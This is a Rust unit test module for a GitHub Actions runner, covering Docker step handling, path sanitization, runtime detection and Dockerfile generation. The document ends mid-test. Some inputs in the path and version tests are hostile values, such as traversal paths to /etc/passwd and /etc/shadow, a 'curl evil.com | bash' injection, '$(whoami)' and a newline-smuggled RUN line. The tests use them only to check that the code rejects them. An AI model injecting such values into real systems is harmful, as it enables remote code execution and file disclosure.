                assert_eq!(image, "ghcr.io/super-linter:latest");
                assert_eq!(entrypoint.as_deref(), Some("/entrypoint.sh"));
                assert_eq!(args, vec!["--flag", "value"]);
            }
            _ => panic!("expected NativeDocker variant"),
        }
    }

    #[test]
    fn prepared_action_native_docker_defaults() {
        let pa = PreparedAction::NativeDocker {
            image: "alpine:latest".to_string(),
            entrypoint: None,
            args: vec![],
        };
        match pa {
            PreparedAction::NativeDocker {
                entrypoint, args, ..
            } => {
                assert!(entrypoint.is_none());
                assert!(args.is_empty());
            }
            _ => panic!("expected NativeDocker variant"),
        }
    }

    // --- extract_docker_runs_config tests ---

    #[test]
    fn extract_runs_config_with_entrypoint_and_args() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  entrypoint: /entrypoint.sh
  args:
    - --flag
    - value
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert_eq!(ep.as_deref(), Some("/entrypoint.sh"));
        assert_eq!(args, vec!["--flag", "value"]);
    }

    #[test]
    fn extract_runs_config_missing_both() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(ep.is_none());
        assert!(args.is_empty());
    }

    #[test]
    fn extract_runs_config_none_definition() {
        let (ep, args) = extract_docker_runs_config(None).unwrap();
        assert!(ep.is_none());
        assert!(args.is_empty());
    }

    #[test]
    fn extract_runs_config_entrypoint_only() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  entrypoint: /custom.sh
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert_eq!(ep.as_deref(), Some("/custom.sh"));
        assert!(args.is_empty());
    }

    #[test]
    fn extract_runs_config_args_only() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args:
    - hello
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(ep.is_none());
        assert_eq!(args, vec!["hello"]);
    }

    #[test]
    fn extract_runs_config_args_as_string() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args: "--flag value 'quoted arg'"
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(ep.is_none());
        assert_eq!(args, vec!["--flag", "value", "quoted arg"]);
    }

    #[test]
    fn extract_runs_config_args_as_plain_string() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args: hello
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(ep.is_none());
        assert_eq!(args, vec!["hello"]);
    }

    #[test]
    fn extract_runs_config_args_string_bad_quoting_is_error() {
        // Unmatched quote — should return an error (consistent with with.args parsing)
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args: "hello 'world"
"#,
        )
        .unwrap();
        let result = extract_docker_runs_config(Some(&yaml));
        assert!(result.is_err(), "unmatched quote should return Err");
        assert!(result.unwrap_err().contains("unmatched quote"));
    }

    // --- Dockerfile path sanitization tests ---

    #[test]
    fn dockerfile_rel_strips_docker_prefix() {
        assert_eq!(
            sanitize_dockerfile_rel("docker://Dockerfile").unwrap(),
            "Dockerfile"
        );
    }

    #[test]
    fn dockerfile_rel_strips_leading_slash() {
        assert_eq!(
            sanitize_dockerfile_rel("docker:///etc/Dockerfile").unwrap(),
            "etc/Dockerfile"
        );
    }

    #[test]
    fn dockerfile_rel_rejects_dotdot_traversal() {
        assert!(sanitize_dockerfile_rel("docker://../../etc/passwd").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_dotdot_in_middle() {
        assert!(sanitize_dockerfile_rel("subdir/../../../etc/shadow").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_backslash_traversal() {
        assert!(sanitize_dockerfile_rel("..\\..\\etc\\shadow").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_mixed_separator_traversal() {
        assert!(sanitize_dockerfile_rel("subdir\\..\\..\\etc/shadow").is_err());
    }

    #[test]
    fn dockerfile_rel_plain_dockerfile() {
        assert_eq!(sanitize_dockerfile_rel("Dockerfile").unwrap(), "Dockerfile");
    }

    #[test]
    fn dockerfile_rel_relative_path() {
        assert_eq!(
            sanitize_dockerfile_rel("./build/Dockerfile").unwrap(),
            "build/Dockerfile"
        );
    }

    #[test]
    fn dockerfile_rel_allows_dotdot_in_filename() {
        // ".." as a substring in a filename is not path traversal
        assert_eq!(
            sanitize_dockerfile_rel("foo..bar/Dockerfile").unwrap(),
            "foo..bar/Dockerfile"
        );
    }

    #[test]
    fn dockerfile_rel_rejects_empty_string() {
        assert!(sanitize_dockerfile_rel("").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_docker_prefix_only() {
        assert!(sanitize_dockerfile_rel("docker://").is_err());
    }

    // --- sub_path sanitization tests ---

    #[test]
    fn sub_path_allows_simple_path() {
        assert!(sanitize_sub_path("subdir").is_ok());
    }

    #[test]
    fn sub_path_allows_nested_path() {
        assert!(sanitize_sub_path("a/b/c").is_ok());
    }

    #[test]
    fn sub_path_rejects_dotdot() {
        assert!(sanitize_sub_path("..").is_err());
    }

    #[test]
    fn sub_path_rejects_dotdot_prefix() {
        assert!(sanitize_sub_path("../../etc").is_err());
    }

    #[test]
    fn sub_path_rejects_dotdot_in_middle() {
        assert!(sanitize_sub_path("a/../../../etc").is_err());
    }

    #[test]
    fn sub_path_allows_dotdot_in_name() {
        // ".." as a substring in a directory name is not traversal
        assert!(sanitize_sub_path("foo..bar").is_ok());
    }

    // --- null byte rejection tests ---

    #[test]
    fn sub_path_rejects_null_byte() {
        assert!(sanitize_sub_path("foo\0bar").is_err());
    }

    #[test]
    fn dockerfile_rel_rejects_null_byte() {
        assert!(sanitize_dockerfile_rel("Dockerfile\0.txt").is_err());
    }

    // --- extract_docker_runs_config with numeric/bool args ---

    #[test]
    fn extract_runs_config_args_coerces_non_string_values() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args:
    - 42
    - true
    - --flag
"#,
        )
        .unwrap();
        let (_, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert_eq!(args.len(), 3);
        assert_eq!(args[0], "42");
        assert_eq!(args[1], "true");
        assert_eq!(args[2], "--flag");
    }

    // --- Mock ContainerRuntime for NativeDocker integration tests ---

    use std::sync::{Arc, Mutex};
    use wrkflw_runtime::container::{ContainerError, ContainerOutput};

    /// Records all `run_container` calls for later assertion.
    #[derive(Clone, Default)]
    struct MockContainerRuntime {
        run_calls: Arc<Mutex<Vec<RunContainerCall>>>,
    }

    #[derive(Debug, Clone)]
    struct RunContainerCall {
        image: String,
        cmd: Vec<String>,
        env_vars: Vec<(String, String)>,
        entrypoint: Option<String>,
    }

    #[async_trait::async_trait]
    impl ContainerRuntime for MockContainerRuntime {
        async fn run_container(
            &self,
            image: &str,
            cmd: &[&str],
            env_vars: &[(&str, &str)],
            _working_dir: &Path,
            _volumes: &[(&Path, &Path)],
            entrypoint: Option<&str>,
        ) -> Result<ContainerOutput, ContainerError> {
            self.run_calls.lock().unwrap().push(RunContainerCall {
                image: image.to_string(),
                cmd: cmd.iter().map(|s| s.to_string()).collect(),
                env_vars: env_vars
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_string()))
                    .collect(),
                entrypoint: entrypoint.map(|s| s.to_string()),
            });
            Ok(ContainerOutput {
                stdout: "mock ok".to_string(),
                stderr: String::new(),
                exit_code: 0,
            })
        }

        async fn pull_image(&self, _image: &str) -> Result<(), ContainerError> {
            Ok(())
        }

        async fn build_image(
            &self,
            _dockerfile: &Path,
            _tag: &str,
            _context_dir: &Path,
        ) -> Result<(), ContainerError> {
            Ok(())
        }

        async fn prepare_language_environment(
            &self,
            _language: &str,
            _version: Option<&str>,
            _additional_packages: Option<Vec<String>>,
        ) -> Result<String, ContainerError> {
            Ok("mock-image:latest".to_string())
        }

        async fn image_exists(&self, _tag: &str) -> Result<bool, ContainerError> {
            Ok(false)
        }
    }

    /// Helper to build a minimal `WorkflowDefinition`.
    fn minimal_workflow() -> WorkflowDefinition {
        WorkflowDefinition {
            name: "test".to_string(),
            on: vec![],
            on_raw: serde_yaml::Value::Null,
            jobs: Default::default(),
            defaults: None,
        }
    }

    /// Helper to build a `Step` with sensible defaults (Step doesn't derive Default).
    fn make_step(
        name: &str,
        uses: &str,
        with: Option<HashMap<String, String>>,
        env: HashMap<String, String>,
    ) -> Step {
        Step {
            name: Some(name.to_string()),
            uses: Some(uses.to_string()),
            run: None,
            with,
            env,
            continue_on_error: None,
            if_condition: None,
            id: None,
            working_directory: None,
            shell: None,
            timeout_minutes: None,
        }
    }

    // --- NativeDocker execute_step integration tests ---

    #[tokio::test]
    async fn native_docker_passes_entrypoint_and_args() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        // Step uses a docker:// image — triggers NativeDocker path via prepare_action
        let step = make_step("docker-step", "docker://alpine:3.18", None, HashMap::new());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        let call = &calls[0];
        assert_eq!(call.image, "alpine:3.18");
        // docker:// actions have no runs.entrypoint — uses image default
        assert!(call.entrypoint.is_none());
        // No args either — uses image CMD
        assert!(call.cmd.is_empty());
    }

    #[tokio::test]
    async fn native_docker_with_args_override() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        with.insert("args".to_string(), "hello world".to_string());
        with.insert("myinput".to_string(), "myvalue".to_string());

        let step = make_step(
            "docker-args-step",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        let call = &calls[0];
        // with.args should be shell-tokenized into the CMD
        assert_eq!(call.cmd, vec!["hello", "world"]);
        // INPUT_* env vars should be set
        let env_map: HashMap<&str, &str> = call
            .env_vars
            .iter()
            .map(|(k, v)| (k.as_str(), v.as_str()))
            .collect();
        assert_eq!(env_map.get("INPUT_ARGS"), Some(&"hello world"));
        assert_eq!(env_map.get("INPUT_MYINPUT"), Some(&"myvalue"));
    }

    #[tokio::test]
    async fn native_docker_empty_with_args_passes_zero_args() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        // Empty string means "pass zero args" — overrides any runs.args
        with.insert("args".to_string(), String::new());

        let step = make_step(
            "docker-empty-args",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        assert!(
            calls[0].cmd.is_empty(),
            "empty with.args should yield zero CMD args"
        );
    }

    #[tokio::test]
    async fn native_docker_step_env_injected() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let mut job_env = HashMap::new();
        job_env.insert("JOB_VAR".to_string(), "from-job".to_string());
        let working_dir = std::env::current_dir().unwrap();

        let mut step_env_map = HashMap::new();
        step_env_map.insert("STEP_VAR".to_string(), "from-step".to_string());

        let step = make_step(
            "docker-env-step",
            "docker://alpine:3.18",
            None,
            step_env_map,
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let env_map: HashMap<&str, &str> = calls[0]
            .env_vars
            .iter()
            .map(|(k, v)| (k.as_str(), v.as_str()))
            .collect();
        assert_eq!(env_map.get("JOB_VAR"), Some(&"from-job"));
        assert_eq!(env_map.get("STEP_VAR"), Some(&"from-step"));
    }

    #[tokio::test]
    async fn native_docker_with_args_unmatched_quote_is_error() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        with.insert("args".to_string(), "hello 'world".to_string());

        let step = make_step(
            "docker-bad-args",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await;
        assert!(result.is_err(), "unmatched quote in with.args should error");
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("unmatched quote"),
            "error should mention unmatched quote, got: {}",
            err
        );
    }

    #[tokio::test]
    async fn native_docker_runs_args_overridden_by_with_args() {
        // When both runs.args (from action.yml) and with.args (from workflow)
        // are present, with.args should win — matching GitHub Actions behavior.
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        with.insert("args".to_string(), "override-arg".to_string());

        let step = make_step(
            "docker-override-step",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        // with.args takes precedence over any runs.args the action may have
        assert_eq!(calls[0].cmd, vec!["override-arg"]);
    }

    #[tokio::test]
    async fn native_docker_with_entrypoint_override() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut with = HashMap::new();
        with.insert("entrypoint".to_string(), "/custom.sh".to_string());
        with.insert("args".to_string(), "hello".to_string());

        let step = make_step(
            "docker-ep-override",
            "docker://alpine:3.18",
            Some(with),
            HashMap::new(),
        );

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        let call = &calls[0];
        // with.entrypoint should override the image default
        assert_eq!(call.entrypoint.as_deref(), Some("/custom.sh"));
        assert_eq!(call.cmd, vec!["hello"]);
    }

    #[test]
    fn extract_runs_config_empty_entrypoint_treated_as_none() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  entrypoint: ""
"#,
        )
        .unwrap();
        let (ep, _) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(
            ep.is_none(),
            "empty entrypoint string should be treated as None"
        );
    }

    // --- sub_path backslash traversal tests ---

    #[test]
    fn sub_path_rejects_backslash_dotdot() {
        assert!(sanitize_sub_path("a\\..\\..\\etc").is_err());
    }

    #[test]
    fn sub_path_rejects_mixed_separator_dotdot() {
        assert!(sanitize_sub_path("a/..\\..\\etc").is_err());
    }

    // --- detect_setup_runtimes tests ---

    fn make_step_uses(uses: &str, with: Option<HashMap<String, String>>) -> Step {
        Step {
            name: None,
            uses: Some(uses.to_string()),
            run: None,
            with,
            env: HashMap::new(),
            continue_on_error: None,
            if_condition: None,
            id: None,
            working_directory: None,
            shell: None,
            timeout_minutes: None,
        }
    }

    fn make_step_run(run: &str) -> Step {
        Step {
            name: None,
            uses: None,
            run: Some(run.to_string()),
            with: None,
            env: HashMap::new(),
            continue_on_error: None,
            if_condition: None,
            id: None,
            working_directory: None,
            shell: None,
            timeout_minutes: None,
        }
    }

    #[test]
    fn detect_setup_runtimes_empty_steps() {
        let runtimes = detect_setup_runtimes(&[]);
        assert!(runtimes.is_empty());
    }

    #[test]
    fn detect_setup_runtimes_no_setup_actions() {
        let steps = vec![
            make_step_uses("actions/checkout@v4", None),
            make_step_uses("actions/cache@v3", None),
            make_step_run("echo hello"),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert!(runtimes.is_empty());
    }

    #[test]
    fn detect_setup_runtimes_single_node() {
        let steps = vec![
            make_step_uses("actions/checkout@v4", None),
            make_step_uses("actions/setup-node@v3", None),
            make_step_run("npm install"),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "node");
        assert_eq!(runtimes[0].version, "20");
        assert!(!runtimes[0].install_script.is_empty());
    }

    #[test]
    fn detect_setup_runtimes_node_with_version() {
        let with = HashMap::from([("node-version".to_string(), "16.x".to_string())]);
        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "node");
        // ".x" suffix is normalized away
        assert_eq!(runtimes[0].version, "16");
    }

    #[test]
    fn detect_setup_runtimes_php() {
        let with = HashMap::from([("php".to_string(), "8.1".to_string())]);
        let steps = vec![make_step_uses("shivammathur/setup-php@v2", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "php");
        assert_eq!(runtimes[0].version, "8.1");
    }

    #[test]
    fn detect_setup_runtimes_multi_language() {
        let steps = vec![
            make_step_uses("actions/checkout@v4", None),
            make_step_uses("shivammathur/setup-php@v2", None),
            make_step_uses("actions/setup-node@v4", None),
            make_step_run("composer install"),
            make_step_run("npm install"),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 2);
        assert_eq!(runtimes[0].language, "php");
        assert_eq!(runtimes[1].language, "node");
    }

    #[test]
    fn detect_setup_runtimes_python_with_version() {
        let with = HashMap::from([("python-version".to_string(), "3.12".to_string())]);
        let steps = vec![make_step_uses("actions/setup-python@v5", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "python");
        assert_eq!(runtimes[0].version, "3.12");
    }

    #[test]
    fn detect_setup_runtimes_go() {
        let with = HashMap::from([("go-version".to_string(), "1.22".to_string())]);
        let steps = vec![make_step_uses("actions/setup-go@v5", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "go");
        assert_eq!(runtimes[0].version, "1.22");
    }

    #[test]
    fn detect_setup_runtimes_rust() {
        let steps = vec![make_step_uses("dtolnay/rust-toolchain@stable", None)];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "rust");
        assert_eq!(runtimes[0].version, "stable");
    }

    #[test]
    fn detect_setup_runtimes_rust_version_from_ref() {
        // dtolnay/rust-toolchain encodes the toolchain in the @ref
        let steps = vec![make_step_uses("dtolnay/rust-toolchain@nightly", None)];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "rust");
        assert_eq!(runtimes[0].version, "nightly");
    }

    #[test]
    fn detect_setup_runtimes_rust_with_overrides_ref() {
        // Explicit with.toolchain takes precedence over @ref
        let with = HashMap::from([("toolchain".to_string(), "beta".to_string())]);
        let steps = vec![make_step_uses("dtolnay/rust-toolchain@nightly", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].version, "beta");
    }

    #[test]
    fn detect_setup_runtimes_rust_sha_ref_falls_back_to_default() {
        // A pinned SHA ref should NOT be treated as a toolchain version
        let steps = vec![make_step_uses(
            "dtolnay/rust-toolchain@d4ff7a3c5bbbc35c47ee72003c3e0a88e24a9919",
            None,
        )];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "rust");
        assert_eq!(runtimes[0].version, "stable");
    }

    #[test]
    fn detect_setup_runtimes_normalizes_dot_x_suffix() {
        // "16.x" should be normalized to "16"
        let with = HashMap::from([("node-version".to_string(), "16.x".to_string())]);
        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].version, "16");
    }

    #[test]
    fn detect_setup_runtimes_java() {
        let with = HashMap::from([("java-version".to_string(), "21".to_string())]);
        let steps = vec![make_step_uses("actions/setup-java@v4", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "java");
        assert_eq!(runtimes[0].version, "21");
    }

    #[test]
    fn detect_setup_runtimes_dotnet() {
        let with = HashMap::from([("dotnet-version".to_string(), "8.0".to_string())]);
        let steps = vec![make_step_uses("actions/setup-dotnet@v4", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        assert_eq!(runtimes[0].language, "dotnet");
        assert_eq!(runtimes[0].version, "8.0");
    }

    #[test]
    fn get_install_script_returns_nonempty_for_known_languages() {
        for lang in &["node", "php", "python", "go", "java", "dotnet", "rust"] {
            let script = get_install_script(lang, "latest");
            assert!(
                !script.is_empty(),
                "install script for {} should not be empty",
                lang
            );
        }
    }

    #[test]
    fn get_install_script_returns_empty_for_unknown() {
        assert!(get_install_script("unknown_lang", "1.0").is_empty());
    }

    // --- version sanitization tests ---

    #[test]
    fn is_safe_version_accepts_valid() {
        assert!(is_safe_version("20"));
        assert!(is_safe_version("3.12"));
        assert!(is_safe_version("16.x"));
        assert!(is_safe_version("8.2-rc1"));
        assert!(is_safe_version("stable"));
        assert!(is_safe_version("1.21_beta"));
    }

    #[test]
    fn is_safe_version_rejects_injection() {
        assert!(!is_safe_version(""));
        assert!(!is_safe_version("20; curl evil.com | bash"));
        assert!(!is_safe_version("20\nRUN malicious"));
        assert!(!is_safe_version("20 && echo pwned"));
        assert!(!is_safe_version("$(whoami)"));
        assert!(!is_safe_version("20`id`"));
    }

    #[test]
    fn detect_setup_runtimes_skips_invalid_version() {
        let with = HashMap::from([(
            "node-version".to_string(),
            "20; curl evil.com | bash".to_string(),
        )]);
        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
        let runtimes = detect_setup_runtimes(&steps);
        assert!(runtimes.is_empty());
    }

    // --- deduplication tests ---

    #[test]
    fn detect_setup_runtimes_deduplicates_same_language() {
        let with_16 = HashMap::from([("node-version".to_string(), "16".to_string())]);
        let with_20 = HashMap::from([("node-version".to_string(), "20".to_string())]);
        let steps = vec![
            make_step_uses("actions/setup-node@v3", Some(with_16)),
            make_step_uses("actions/setup-node@v4", Some(with_20)),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert_eq!(runtimes.len(), 1);
        // Last one wins
        assert_eq!(runtimes[0].version, "20");
    }

    // --- exact match tests ---

    #[test]
    fn detect_setup_runtimes_ignores_similar_action_names() {
        let steps = vec![
            make_step_uses("actions/setup-node-legacy@v1", None),
            make_step_uses("actions/setup-nodejs@v1", None),
        ];
        let runtimes = detect_setup_runtimes(&steps);
        assert!(runtimes.is_empty());
    }

    // --- determine_action_image exact-match tests ---

    #[test]
    fn determine_action_image_exact_match_setup_actions() {
        // Known setup actions should return the runner base
        assert_eq!(
            determine_action_image("actions/setup-node"),
            "catthehacker/ubuntu:act-latest"
        );
        assert_eq!(
            determine_action_image("actions/setup-python"),
            "catthehacker/ubuntu:act-latest"
        );
        assert_eq!(
            determine_action_image("shivammathur/setup-php"),
            "catthehacker/ubuntu:act-latest"
        );
        assert_eq!(
            determine_action_image("dtolnay/rust-toolchain"),
            "catthehacker/ubuntu:act-latest"
        );
    }

    #[test]
    fn determine_action_image_rejects_similar_names() {
        // Similar-but-different action names must NOT match setup actions
        assert_eq!(
            determine_action_image("actions/setup-node-legacy"),
            "node:20-slim"
        );
        assert_eq!(
            determine_action_image("actions/setup-nodejs"),
            "node:20-slim"
        );
    }

    #[test]
    fn determine_action_image_core_actions() {
        assert_eq!(
            determine_action_image("actions/checkout"),
            "catthehacker/ubuntu:act-latest"
        );
        assert_eq!(
            determine_action_image("actions/cache"),
            "catthehacker/ubuntu:act-latest"
        );
    }

    #[test]
    fn determine_action_image_namespace_prefix() {
        // docker/* and aws-actions/* use namespace prefix matching
        assert_eq!(
            determine_action_image("docker/build-push-action"),
            "docker:latest"
        );
        assert_eq!(
            determine_action_image("docker/login-action"),
            "docker:latest"
        );
        assert_eq!(
            determine_action_image("aws-actions/configure-aws-credentials"),
            "amazon/aws-cli:latest"
        );
    }

    // --- Dockerfile generation tests ---

    #[test]
    fn generate_combined_dockerfile_single_runtime() {
        let runtimes = vec![SetupRuntime {
            language: "node".to_string(),
            version: "20".to_string(),
            install_script: get_install_script("node", "20"),
        }];
        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
        assert!(df.starts_with("FROM ubuntu:latest\n"));
        assert!(df.contains("nodesource"));
        // Everything in a single RUN layer
        assert_eq!(df.matches("RUN ").count(), 1);
    }

    #[test]
    fn generate_combined_dockerfile_multi_runtime_single_run() {
        let runtimes = vec![
            SetupRuntime {
                language: "node".to_string(),
                version: "20".to_string(),
                install_script: get_install_script("node", "20"),
            },
            SetupRuntime {
                language: "python".to_string(),
                version: "3.12".to_string(),
                install_script: get_install_script("python", "3.12"),
            },
        ];
        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
        // Everything in a single RUN layer
        assert_eq!(df.matches("RUN ").count(), 1);
        assert!(df.contains("nodesource"));
        assert!(df.contains("deadsnakes"));
    }

    #[test]
    fn generate_combined_dockerfile_skips_empty_scripts() {
        let runtimes = vec![SetupRuntime {
            language: "unknown".to_string(),
            version: "1.0".to_string(),
            install_script: String::new(),
        }];
        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
        // Single RUN layer with just the base packages
        assert_eq!(df.matches("RUN ").count(), 1);
    }

    #[test]
    fn combined_image_tag_is_deterministic() {
        let runtimes = vec![
            SetupRuntime {
                language: "node".to_string(),
                version: "20".to_string(),
                install_script: "install node".to_string(),
            },
            SetupRuntime {
                language: "python".to_string(),
                version: "3.12".to_string(),
                install_script: "install python".to_string(),
            },
        ];
        let df = "FROM base\nRUN install stuff\n";
        let tag1 = combined_image_tag(&runtimes, df);
        let tag2 = combined_image_tag(&runtimes, df);
